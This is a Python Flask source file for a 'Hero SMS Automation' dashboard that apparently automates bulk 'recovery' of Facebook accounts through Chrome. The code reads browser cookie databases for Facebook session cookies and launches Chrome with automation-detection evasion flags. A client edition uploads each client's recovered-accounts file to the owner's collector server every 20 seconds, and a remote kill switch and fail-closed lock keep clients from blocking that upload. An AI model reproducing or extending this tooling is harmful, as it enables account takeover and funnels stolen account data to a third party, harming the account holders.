    """Split recovered_accounts.txt content into individual account blocks,
    each starting with the '--- Recovered Account' marker."""
    blocks = []
    for part in (text or "").split("--- Recovered Account")[1:]:
        block = ("--- Recovered Account" + part).rstrip()
        if block.strip():
            blocks.append(block)
    return blocks


def _log_client_event(cid, message):
    """Append a timestamped activity line to the client's log (owner side)."""
    try:
        from datetime import datetime
        folder = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid))
        os.makedirs(folder, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(os.path.join(folder, "activity.log"), "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception:
        pass


@app.route('/api/collect', methods=['POST'])
def api_collect():
    """Receive a client's recovered_accounts.txt and save it under
    Client_Recoveries/<client>/. Authenticated by the client's key. Returns
    whether the client is still enabled (remote kill switch)."""
    data = request.json or {}
    cid = (data.get("client_id") or "").strip()
    key = data.get("key") or ""
    content = data.get("content") or ""
    c = find_client_key(cid)
    if not c or c.get("key") != key:
        return jsonify({"status": "error", "message": "Invalid client credentials."}), 401
    if not c.get("enabled", True):
        return jsonify({"status": "disabled", "enabled": False,
                        "message": c.get("disabled_message") or "Your access has been disabled by the administrator."}), 200
    # ACCUMULATE (never overwrite): merge the incoming accounts into what we
    # already have and dedupe, so an empty/cleared client upload can never wipe
    # the owner's collected copy.
    folder = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid))
    dest_file = os.path.join(folder, "recovered_accounts.txt")
    try:
        os.makedirs(folder, exist_ok=True)
        existing = ""
        if os.path.exists(dest_file):
            with open(dest_file, "r", encoding="utf-8") as f:
                existing = f.read()
        prev_total = len(_account_blocks(existing))
        seen, merged = set(), []
        for block in _account_blocks(existing) + _account_blocks(content):
            norm = " ".join(block.split())
            if norm and norm not in seen:
                seen.add(norm)
                merged.append(block)
        merged_text = ("\n\n".join(merged) + "\n") if merged else ""
        with open(dest_file, "w", encoding="utf-8") as f:
            f.write(merged_text)
        total = len(merged)
        if total > prev_total:
            _log_client_event(cid, f"Recovered {total - prev_total} new account(s) — total {total}")
    except Exception as e:
        return jsonify({"status": "error", "message": f"Save failed: {e}"}), 500
    # Update last-seen / cumulative count (atomic under the lock)
    with _client_keys_lock:
        items = load_client_keys()
        for it in items:
            if it.get("client_id", "").lower() == cid.lower():
                it["last_seen"] = int(time.time())
                it["last_count"] = total
        save_client_keys(items)
    return jsonify({"status": "success", "enabled": True})


@app.route('/api/clients', methods=['GET'])
@owner_required
@manager_required
def api_clients_list():
    return jsonify([
        {
            "client_id": c.get("client_id"),
            "enabled": c.get("enabled", True),
            "last_seen": c.get("last_seen", 0),
            "last_count": c.get("last_count", 0),
            "created_at": c.get("created_at", 0),
        }
        for c in load_client_keys()
    ])


@app.route('/api/clients', methods=['POST'])
@owner_required
@manager_required
def api_clients_create():
    data = request.json or {}
    cid = (data.get("client_id") or "").strip()
    if not re.match(r'^[A-Za-z0-9_-]{1,30}$', cid):
        return jsonify({"status": "error", "message": "Name must be 1-30 chars: letters, numbers, - or _."}), 400
    key = secrets.token_hex(16)
    with _client_keys_lock:
        if find_client_key(cid):
            return jsonify({"status": "error", "message": "That client already exists."}), 400
        items = load_client_keys()
        items.append({"client_id": cid, "key": key, "enabled": True,
                      "created_at": int(time.time()), "last_seen": 0, "last_count": 0})
        save_client_keys(items)
    return jsonify({"status": "success", "message": f"Client '{cid}' created.", "client_id": cid, "key": key})


@app.route('/api/clients/<cid>/toggle', methods=['POST'])
@owner_required
@manager_required
def api_clients_toggle(cid):
    with _client_keys_lock:
        items = load_client_keys()
        target = next((c for c in items if c.get("client_id", "").lower() == cid.lower()), None)
        if not target:
            return jsonify({"status": "error", "message": "Client not found."}), 404
        target["enabled"] = not target.get("enabled", True)
        save_client_keys(items)
    state = "enabled" if target["enabled"] else "disabled"
    _log_client_event(cid, f"{state.capitalize()} by owner")
    return jsonify({"status": "success", "message": f"Client '{cid}' {state}.", "enabled": target["enabled"]})


@app.route('/api/clients/<cid>', methods=['DELETE'])
@owner_required
@manager_required
def api_clients_delete(cid):
    with _client_keys_lock:
        items = load_client_keys()
        if not any(c.get("client_id", "").lower() == cid.lower() for c in items):
            return jsonify({"status": "error", "message": "Client not found."}), 404
        remaining = [c for c in items if c.get("client_id", "").lower() != cid.lower()]
        # Deleting the last client legitimately empties the file; write directly
        with open(CLIENT_KEYS_PATH, "w", encoding="utf-8") as f:
            json.dump(remaining, f, indent=4)
    return jsonify({"status": "success", "message": f"Client '{cid}' deleted."})


@app.route('/api/clients/<cid>/key', methods=['GET'])
@owner_required
@manager_required
def api_clients_key(cid):
    c = find_client_key(cid)
    if not c:
        return jsonify({"status": "error", "message": "Client not found."}), 404
    return jsonify({"client_id": c.get("client_id"), "key": c.get("key")})


@app.route('/api/clients/<cid>/download', methods=['GET'])
@owner_required
@manager_required
def api_clients_download(cid):
    path = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid), "recovered_accounts.txt")
    if not os.path.exists(path):
        return jsonify({"status": "error", "message": "No data collected from this client yet."}), 404
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    return Response(content, mimetype="text/plain; charset=utf-8",
                    headers={"Content-Disposition": f'attachment; filename="recovered_accounts_{_safe_client_folder(cid)}.txt"'})


@app.route('/api/clients/<cid>/log', methods=['GET'])
@owner_required
@manager_required
def api_clients_log(cid):
    path = os.path.join(COLLECTOR_DIR, _safe_client_folder(cid), "activity.log")
    lines = []
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                lines = f.read().splitlines()[-300:]
        except Exception:
            pass
    return jsonify({"client_id": cid, "lines": lines})


@app.route('/api/activity', methods=['GET'])
@owner_required
@manager_required
def api_activity():
    """Combined activity feed across ALL clients, plus summary totals."""
    keys = load_client_keys()
    summary = {
        "clients": len(keys),
        "active": sum(1 for c in keys if c.get("enabled", True)),
        "total_recovered": sum(int(c.get("last_count", 0)) for c in keys),
    }
    events = []
    if os.path.isdir(COLLECTOR_DIR):
        for name in os.listdir(COLLECTOR_DIR):
            logpath = os.path.join(COLLECTOR_DIR, name, "activity.log")
            if not os.path.exists(logpath):
                continue
            try:
                with open(logpath, "r", encoding="utf-8") as f:
                    for line in f.read().splitlines():
                        m = re.match(r'^\[([^\]]+)\]\s*(.*)$', line)
                        if m:
                            events.append({"time": m.group(1), "client": name, "message": m.group(2)})
            except Exception:
                pass
    # Newest first (YYYY-MM-DD HH:MM:SS sorts correctly as a string)
    events.sort(key=lambda e: e["time"], reverse=True)
    return jsonify({"summary": summary, "events": events[:500]})


def _client_stop_bot():
    try:
        if is_running:
            with open(os.path.join(BASE_DIR, "stop.flag"), "w", encoding="utf-8") as f:
                f.write("stop")
    except Exception:
        pass


def client_uploader_loop():
    """CLIENT edition: periodically upload a COPY of the recovered accounts to
    the owner's collector AND honor the remote disable switch. The client keeps
    its own local recovered_accounts.txt; the owner just receives a copy.

    FAIL-CLOSED: the app stays locked until a successful check-in, and if it
    cannot reach the owner's server for longer than the grace period (e.g. the
    client firewalls it to dodge a disable), it locks itself again."""
    import urllib.request
    last_ok = None
    while True:
        try:
            content = ""
            if os.path.exists(ACCOUNTS_PATH):
                with open(ACCOUNTS_PATH, "r", encoding="utf-8") as f:
                    content = f.read()
            payload = json.dumps({"client_id": CLIENT_ID, "key": CLIENT_KEY, "content": content}).encode()
            req = urllib.request.Request(COLLECTOR_URL, data=payload,
                                         headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=15) as resp:
                body = json.loads(resp.read().decode() or "{}")
            last_ok = time.time()
            if body.get("enabled") is False or body.get("status") == "disabled":
                client_status["disabled"] = True
                client_status["verified"] = True
                client_status["message"] = body.get("message") or "Your access has been disabled by the administrator."
                _client_stop_bot()
            else:
                client_status["disabled"] = False
                client_status["verified"] = True
        except Exception:
            # Could not reach the owner's server -> FAIL CLOSED after the grace period
            if last_ok is None or (time.time() - last_ok) > CLIENT_GRACE_SECONDS:
                client_status["disabled"] = True
                client_status["verified"] = False
                client_status["message"] = "Can't verify your access with the server. Access is paused until it reconnects."
                _client_stop_bot()
        time.sleep(20)


@app.route('/')
def index():
    # Render UI using render_template_string for single-file delivery
    # Keep standard template outside Flask logic or inside, since we have template_html
    user = current_user()
    return render_template_string(
        HTML_TEMPLATE,
        current_username=user["username"],
        is_admin=is_admin(user),
        is_owner=is_owner(user),
        is_manager=IS_MANAGER,
    )


@app.route('/api/config', methods=['GET', 'POST'])
def api_config():
    if request.method == 'POST':
        data = request.json
        if save_config_data(data):
            return jsonify({"status": "success", "message": "Configuration saved."})
        return jsonify({"status": "error", "message": "Failed to save configuration."}), 500
    return jsonify(load_config_data())


@app.route('/api/status', methods=['GET'])
def api_status():
    global is_running, session_start_time, session_stop_requested_time, session_recovered_baseline
    elapsed = 0
    start_time_val = None
    recovered_in_session = 0
    if is_running and session_start_time:
        end_time = session_stop_requested_time if session_stop_requested_time else time.time()
        elapsed = int(end_time - session_start_time)
        start_time_val = session_start_time
        try:
            current_count = len(parse_recovered_accounts())
            recovered_in_session = max(0, current_count - session_recovered_baseline)
        except:
            pass
    return jsonify({
        "is_running": is_running,
        "elapsed": elapsed,
        "start_time": start_time_val,
        "recovered": recovered_in_session
    })


@app.route('/api/start', methods=['POST'])
def api_start():
    global thread, is_running
    if is_running:
        return jsonify({"status": "error", "message": "Automation is already running."}), 400
    
    # Clear log queue
    while not log_queue.empty():
        try:
            log_queue.get_nowait()
        except queue.Empty:
            break
            
    thread = threading.Thread(target=run_automation_process, daemon=True)
    thread.start()
    return jsonify({"status": "success", "message": "Automation started."})


@app.route('/api/stop', methods=['POST'])
def api_stop():
    global process, is_running, session_stop_requested_time, thread
    if not is_running or not process:
        return jsonify({"status": "error", "message": "Automation is not running."}), 400
        
    try:
        # Freeze elapsed time at the exact moment the user requests a stop
        session_stop_requested_time = time.time()
        
        # Write stop.flag to trigger a graceful shutdown
        flag_path = os.path.join(BASE_DIR, "stop.flag")
        with open(flag_path, "w", encoding="utf-8") as f:
            f.write("stop")
            
        log_queue.put("[SYSTEM] Stop request sent. Waiting for graceful shutdown...\n")
        
        # Wait up to 5 seconds for it to exit gracefully
        start_wait = time.time()
        graceful_exit = False
        while time.time() - start_wait < 5:
            if process.poll() is not None:
                graceful_exit = True
                break
            time.sleep(0.5)
            
        if not graceful_exit:
            # Force kill if it doesn't shut down in 5 seconds
            log_queue.put("[SYSTEM] Process did not exit within 5s. Force terminating...\n")
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(process.pid)], capture_output=True)
            
        # Wait for the thread to exit cleanly and commit stats to the JSON database
        if thread and thread.is_alive():
            thread.join(timeout=3)
            
        # Clean up stop.flag if it still exists
        if os.path.exists(flag_path):
            try:
                os.remove(flag_path)
            except:
                pass
                
        is_running = False
        process = None
        return jsonify({"status": "success", "message": "Automation stopped."})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to stop automation: {e}"}), 500


def get_official_chrome_user_data_dir() -> str:
    if sys.platform == 'win32':
        return os.path.expandvars(r"%LocalAppData%\Google\Chrome\User Data")
    elif sys.platform == 'darwin':
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")
    else:
        return os.path.expanduser("~/.config/google-chrome")


def is_profile_logged_in(profile_path: str) -> bool:
    cookie_paths = [
        os.path.join(profile_path, "Network", "Cookies"),
        os.path.join(profile_path, "Cookies")
    ]
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                import sqlite3
                import tempfile
                import shutil
                
                temp_dir = tempfile.gettempdir()
                temp_cookie_path = os.path.join(temp_dir, f"temp_cookies_check_{os.path.basename(profile_path)}.db")
                try:
                    shutil.copy2(path, temp_cookie_path)
                except Exception:
                    temp_cookie_path = path
                    
                conn = sqlite3.connect(temp_cookie_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
                if not cursor.fetchone():
                    conn.close()
                    continue
                cursor.execute("SELECT name FROM cookies WHERE host_key LIKE '%facebook.com%' AND name='c_user'")
                row = cursor.fetchone()
                conn.close()
                if row:
                    return True
            except Exception:
                pass
    return False


def generate_next_profile_name(user_data_dir: str = None) -> str:
    official_path = get_official_chrome_user_data_dir()
    standalone_path = os.path.join(BASE_DIR, "chrome_profiles")
    
    existing_profiles = set()
    max_num = 1
    
    for directory in [official_path, standalone_path]:
        if directory and os.path.exists(directory):
            try:
                for item in os.listdir(directory):
                    if os.path.isdir(os.path.join(directory, item)):
                        match = re.match(r"^Profile\s*(\d+)$", item, re.I)
                        if match:
                            num = int(match.group(1))
                            existing_profiles.add(num)
                            if num > max_num:
                                max_num = num
            except Exception:
                pass

    # Scan existing profiles to check if they have a logged-in Facebook session
    for i in sorted(list(existing_profiles)):
        profile_folder_name = f"Profile {i}"
        
        standalone_dir = os.path.join(standalone_path, profile_folder_name)
        official_dir = os.path.join(official_path, profile_folder_name)
        
        is_logged = False
        if os.path.exists(standalone_dir):
            is_logged = is_logged or is_profile_logged_in(standalone_dir)
        if os.path.exists(official_dir):
            is_logged = is_logged or is_profile_logged_in(official_dir)
            
        if not is_logged:
            print(f"ℹ️ Profile {profile_folder_name} has no active Facebook session. Reusing it!")
            return profile_folder_name

    # If all existing profiles are active, return a new one
    return f"Profile {max_num + 1}"


def is_chrome_running() -> bool:
    try:
        import subprocess
        if sys.platform == 'win32':
            out = subprocess.check_output("tasklist /FI \"IMAGENAME eq chrome.exe\"", shell=True, text=True)
            return "chrome.exe" in out.lower()
        else:
            out = subprocess.check_output("pgrep -f chrome", shell=True, text=True)
            return bool(out.strip())
    except Exception:
        return False


@app.route('/api/launch_chrome', methods=['POST'])
def api_launch_chrome():
    try:
        import socket
        def is_port_free(p_num):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.bind(("127.0.0.1", p_num))
                    return True
                except OSError:
                    return False

        port = 9222
        while not is_port_free(port):
            port += 1

        # Load configured profile name from config.json
        config_path = os.path.join(BASE_DIR, "config.json")
        profile_name = "Profile 1"
        if os.path.exists(config_path):
            try:
                with open(config_path, "r", encoding="utf-8") as f:
                    cfg_data = json.load(f)
                    profile_name = cfg_data.get("chrome_profile_name", "Profile 1")
            except Exception:
                pass
        
        # Align User Data directory with hero_sms_automation.py to prevent session logs logout
        user_data_dir = os.path.join(BASE_DIR, "chrome_profiles_hero")
        os.makedirs(user_data_dir, exist_ok=True)
        print(f"ℹ️ Launching Hero SMS Chrome profile '{profile_name}' in shared folder: {user_data_dir}")
        
        # Find chrome
        paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe"),
            r"C:\Program Files\Google\Chrome\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\chrome.exe",
        ]
        chrome_path = None
        for p_executable in paths:
            if os.path.exists(p_executable):
                chrome_path = p_executable
                break
        
        if not chrome_path:
            chrome_path = "chrome.exe" # system fallback
            
        cmd = [
            chrome_path,
            f"--remote-debugging-port={port}",
            f"--user-data-dir={user_data_dir}",
            f"--profile-directory={profile_name}",
            "--no-first-run",
            "--skip-first-run-ui",
            "--no-default-browser-check",
            "--disable-features=ProfilePicker",
            "--disable-features=Translate",
            "--disable-blink-features=AutomationControlled"
        ]
        
        creation_flags = 0
        if sys.platform == 'win32':
            import subprocess
            creation_flags = subprocess.CREATE_NEW_CONSOLE
            
        # Launch Chrome detached
        chrome_proc = subprocess.Popen(cmd, creationflags=creation_flags)
        # Remember this instance's Chrome so kill_chrome stays instance-scoped
        try:
            launched_chrome_pids.append(chrome_proc.pid)
        except Exception:
            pass

        # Auto update config.json
        config = load_config_data()
        config["chrome_debug_url"] = f"http://127.0.0.1:{port}"
        config["chrome_profile_name"] = profile_name
        save_config_data(config)
        
        return jsonify({
            "status": "success",
            "port": port,
            "chrome_debug_url": f"http://127.0.0.1:{port}",
            "profile_name": profile_name,
            "message": f"Successfully launched Chrome Profile on Port {port}"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to launch Chrome: {e}"}), 500


@app.route('/api/kill_chrome', methods=['POST'])
def api_kill_chrome():
    """Close ONLY the Chrome tied to this instance's debug port (plus any Chrome
    this instance launched). Other Chrome windows on the PC are left running."""
    try:
        global launched_chrome_pids
        targets = set(launched_chrome_pids)
        # Also target whatever is listening on the configured remote-debugging port
        try:
            dbg = load_config_data().get("chrome_debug_url", "") or ""
            m = re.search(r":(\d+)", dbg)
            if m:
                pid = _pid_on_port(int(m.group(1)))
                if pid:
                    targets.add(pid)
        except Exception:
            pass
        killed = sum(1 for pid in targets if _kill_pid(pid))
        launched_chrome_pids = []
        if killed:
            return jsonify({"status": "success", "message": f"Closed this instance's Chrome ({killed} process). Other Chrome windows are untouched."})
        return jsonify({"status": "success", "message": "No Chrome for this instance's debug port was running."})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to terminate Chrome: {e}"}), 500


@app.route('/api/accounts', methods=['GET'])
def api_accounts():
    return jsonify(parse_recovered_accounts())


@app.route('/api/stats', methods=['GET'])
def api_stats():
    recalculate_recovered_counts()
    stats_path = os.path.join(BASE_DIR, "recovered_stats.json")
    data = {}
    if os.path.exists(stats_path):
        try:
            with open(stats_path, "r", encoding="utf-8") as f:
                raw = json.load(f)
            for k, v in raw.items():
                if isinstance(v, dict):
                    data[k] = {
                        "recovered": v.get("recovered", 0),
                        "spent": v.get("spent", 0.0),
                        "duration": v.get("duration", 0),
                        "failed_logins": v.get("failed_logins", 0),
                        "success_duration": v.get("success_duration", 0)
                    }
                else:
                    data[k] = {
                        "recovered": int(v),
                        "spent": 0.0,
                        "duration": 0,
                        "failed_logins": 0,
                        "success_duration": 0
                    }
        except Exception:
            pass
    return jsonify(data)


@app.route('/api/clear_accounts', methods=['POST'])
def api_clear_accounts():
    try:
        if os.path.exists(ACCOUNTS_PATH):
            os.remove(ACCOUNTS_PATH)
        return jsonify({"status": "success", "message": "Accounts cleared."})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to clear accounts: {e}"}), 500


@app.route('/api/download_accounts', methods=['GET'])
def api_download_accounts():
    """Download recovered_accounts.txt (whole file, or only one day's session
    when ?date=YYYY-MM-DD is given). Served to whoever is logged in, so each
    instance only ever exposes its own recovered accounts."""
    if not os.path.exists(ACCOUNTS_PATH):
        return jsonify({"status": "error", "message": "No recovered accounts yet."}), 404
    try:
        with open(ACCOUNTS_PATH, "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        return jsonify({"status": "error", "message": f"Could not read file: {e}"}), 500

    date = (request.args.get("date") or "").strip()
    suffix = ""
    if date:
        # Keep only account blocks whose header date matches the selected day
        blocks = content.split("--- Recovered Account")
        kept = ["--- Recovered Account" + b for b in blocks
                if b.strip() and date in (b.strip().splitlines() or [""])[0]]
        content = "".join(kept)
        suffix = "_" + date
        if not content.strip():
            return jsonify({"status": "error", "message": f"No accounts for {date}."}), 404

    instance = os.path.basename(BASE_DIR) or "hero"
    download_name = f"recovered_accounts_{instance}{suffix}.txt"
    return Response(
        content,
        mimetype="text/plain; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{download_name}"'},
    )


@app.route('/stream')
def stream_logs():
    def generate():
        while True:
            try:
                line = log_queue.get(timeout=10)
                yield f"data: {line}\n\n"
            except queue.Empty:
                yield "data: [PING]\n\n"
    return Response(generate(), mimetype='text/event-stream')


LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Hero SMS Automation</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0b0f19;
            --container-bg: rgba(17, 24, 39, 0.7);
            --border-color: rgba(255, 255, 255, 0.08);
            --primary-glow: #6366f1;
            --primary-glow-hover: #4f46e5;
            --danger-color: #ef4444;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --font-main: 'Outfit', sans-serif;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: var(--font-main);
            background: var(--bg-color);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: radial-gradient(circle at 20% 20%, rgba(99,102,241,0.15), transparent 40%),
                              radial-gradient(circle at 80% 80%, rgba(16,185,129,0.10), transparent 40%);
        }
        .login-card {
            width: 100%;
            max-width: 380px;
            background: var(--container-bg);
            border: 1px solid var(--border-color);
            border-radius: 18px;
            padding: 2.5rem 2rem;
            backdrop-filter: blur(14px);
            box-shadow: 0 20px 60px rgba(0,0,0,0.45);
        }
        .login-logo {
            display: flex; align-items: center; gap: 0.6rem;
            justify-content: center; margin-bottom: 0.4rem;
        }
        .login-logo svg { width: 34px; height: 34px; fill: var(--primary-glow); }
        .login-logo span { font-size: 1.25rem; font-weight: 600; }
        .login-sub { text-align: center; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1.8rem; }
        label { display: block; font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.35rem; }
        input {
            width: 100%;
            padding: 0.7rem 0.9rem;
            margin-bottom: 1.1rem;
            background: rgba(0,0,0,0.25);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            color: var(--text-main);
            font-family: var(--font-main);
            font-size: 0.95rem;
            outline: none;
            transition: border-color .15s;
        }
        input:focus { border-color: var(--primary-glow); }
        button {
            width: 100%;
            padding: 0.75rem;
            background: var(--primary-glow);
            color: #fff;
            border: none;
            border-radius: 10px;
            font-family: var(--font-main);
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: background .15s;
        }
        button:hover { background: var(--primary-glow-hover); }
        .pw-wrap { position: relative; }
        .pw-wrap > input { padding-right: 4rem; }
        .pw-toggle {
            position: absolute; right: 8px; top: 9px;
            width: auto; margin: 0; padding: 0.3rem 0.55rem;
            background: rgba(255,255,255,0.06);
            border: 1px solid var(--border-color);
            color: var(--text-muted);
            font-size: 0.72rem; font-weight: 500; line-height: 1;
            border-radius: 6px; cursor: pointer;
        }
        .pw-toggle:hover { background: rgba(255,255,255,0.12); color: var(--text-main); }
        .error {
            background: rgba(239,68,68,0.12);
            border: 1px solid rgba(239,68,68,0.4);
            color: #fca5a5;
            padding: 0.6rem 0.8rem;
            border-radius: 10px;
            font-size: 0.85rem;
            margin-bottom: 1.2rem;
            text-align: center;
        }
        .notice {
            background: rgba(245,158,11,0.12);
            border: 1px solid rgba(245,158,11,0.4);
            color: #fcd34d;
            padding: 0.7rem 0.9rem;
            border-radius: 10px;
            font-size: 0.85rem;
            margin-bottom: 1.2rem;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="login-logo">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
            <span>Hero SMS Automation</span>
        </div>
        <div class="login-sub">Sign in to continue</div>
        {% if notice %}<div class="notice">{{ notice }}</div>{% endif %}
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" autocomplete="username" autofocus required>
            <label for="password">Password</label>
            <div class="pw-wrap">
                <input type="password" id="password" name="password" autocomplete="current-password" required>
                <button type="button" class="pw-toggle" onclick="togglePw('password', this)" aria-label="Show or hide password">Show</button>
            </div>
            <button type="submit">Sign In</button>
        </form>
    </div>
    <script>
        function togglePw(id, btn) {
            const el = document.getElementById(id);
            if (!el) return;
            if (el.type === 'password') { el.type = 'text'; btn.textContent = 'Hide'; }
            else { el.type = 'password'; btn.textContent = 'Show'; }
        }
    </script>
</body>
</html>
"""


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hero SMS Automation Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0b0f19;
            --container-bg: rgba(17, 24, 39, 0.7);
            --border-color: rgba(255, 255, 255, 0.08);
            --primary-glow: #6366f1;
            --primary-glow-hover: #4f46e5;
            --success-color: #10b981;
            --danger-color: #ef4444;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --font-main: 'Outfit', sans-serif;
            --font-mono: 'Fira Code', monospace;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            user-select: none;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.1) 0px, transparent 50%);
            background-attachment: fixed;
            color: var(--text-main);
            font-family: var(--font-main);
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1.5rem 2.5rem;
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(12px);
            position: sticky;
            top: 0;
            z-index: 100;
            background: rgba(11, 15, 25, 0.8);
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .logo-icon {
            width: 38px;
            height: 38px;
            background: linear-gradient(135deg, var(--primary-glow), #10b981);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 15px rgba(99, 102, 241, 0.4);
        }

        .logo-icon svg {
            width: 22px;
            height: 22px;
            fill: white;
        }

        .logo-text {
            font-size: 1.5rem;
            font-weight: 700;
            letter-spacing: -0.025em;
            background: linear-gradient(to right, #ffffff, #a5b4fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .status-badge {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background: rgba(255, 255, 255, 0.05);
            padding: 0.5rem 1rem;
            border-radius: 9999px;
            border: 1px solid var(--border-color);
            font-size: 0.875rem;
            font-weight: 500;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: var(--text-muted);
            box-shadow: 0 0 8px var(--text-muted);
        }

        .status-dot.running {
            background-color: var(--success-color);
            box-shadow: 0 0 12px var(--success-color);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(0.9); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(0.9); opacity: 0.8; }
        }

        .main-container {
            display: grid;
            grid-template-columns: 420px 1fr;
            gap: 2rem;
            padding: 2rem 2.5rem;
            flex-grow: 1;
            max-width: 1600px;
            margin: 0 auto;
            width: 100%;
        }

        /* Glassmorphism panel styling */
        .glass-panel {
            background: var(--container-bg);
            border-radius: 16px;
            border: 1px solid var(--border-color);
            backdrop-filter: blur(16px);
            padding: 1.75rem;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        .panel-title {
            font-size: 1.25rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            padding-bottom: 0.75rem;
        }

        .panel-title svg {
            width: 20px;
            height: 20px;
            stroke: var(--primary-glow);
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        label {
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--text-muted);
            letter-spacing: 0.025em;
            text-transform: uppercase;
        }

        input[type="text"], input[type="password"], input[type="number"], select {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 0.75rem 1rem;
            color: var(--text-main);
            font-family: var(--font-main);
            font-size: 0.95rem;
            transition: all 0.25s ease;
            outline: none;
            width: 100%;
        }

        /* Remove number input spin arrows for cleaner aesthetics */
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type="number"] {
            -moz-appearance: textfield;
        }

        input:focus, select:focus {
            border-color: var(--primary-glow);
            box-shadow: 0 0 10px rgba(99, 102, 241, 0.2);
            background: rgba(255, 255, 255, 0.06);
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            cursor: pointer;
            padding: 0.25rem 0;
        }

        .checkbox-container input {
            display: none;
        }

        .custom-checkbox {
            width: 20px;
            height: 20px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.04);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }

        .checkbox-container input:checked + .custom-checkbox {
            background-color: var(--primary-glow);
            border-color: var(--primary-glow);
            box-shadow: 0 0 8px rgba(99, 102, 241, 0.4);
        }

        .custom-checkbox::after {
            content: "";
            width: 6px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
            display: none;
        }

        .checkbox-container input:checked + .custom-checkbox::after {
            display: block;
        }

        .btn {
            border-radius: 8px;
            font-weight: 600;
            font-size: 1rem;
            padding: 0.875rem 1.5rem;
            cursor: pointer;
            transition: all 0.25s ease;
            outline: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            width: 100%;
            border: none;
        }

        .btn-primary {
